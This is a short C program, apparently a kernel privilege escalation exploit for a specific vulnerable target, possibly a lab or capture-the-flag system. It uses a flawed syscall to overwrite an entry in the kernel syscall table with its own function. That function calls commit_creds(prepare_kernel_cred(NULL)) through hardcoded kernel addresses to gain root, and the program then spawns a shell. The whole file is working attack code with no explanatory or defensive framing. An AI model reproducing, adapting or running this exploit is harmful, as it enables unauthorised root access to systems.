#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define SYS_UPPER 0xdf
#define SYS_EXPLOIT 0xe0

void escalate_priv()
{
	int (*printk)(const char *fmt, ...) = (void *)0x8035fd9c;
	int (*commit_creds)(void *) = (void *)0x8003f56c;
	void *(*prepare_kernel_cred)(void *) = (void *)0x8003f924;

	printk("[*] Escalating privilieges.\n");

	commit_creds(prepare_kernel_cred(NULL));
}

void create_escalate_priv_syscall()
{
	puts("[*] Creating the privilege escalation syscall.");
	void **syscall_table = (void **)0x8000e348;
	void *escalate_priv_func = &escalate_priv;
	syscall(SYS_UPPER, &escalate_priv_func, &syscall_table[SYS_EXPLOIT]);
}

void call_escalate_priv_syscall()
{
	puts("[*] Calling the malicious syscall.");
	syscall(SYS_EXPLOIT);
}

void pop_shell()
{
	puts("[*] Popping shell.");
	system("sh");
}

int main()
{
	create_escalate_priv_syscall();
	call_escalate_priv_syscall();
	pop_shell();
}
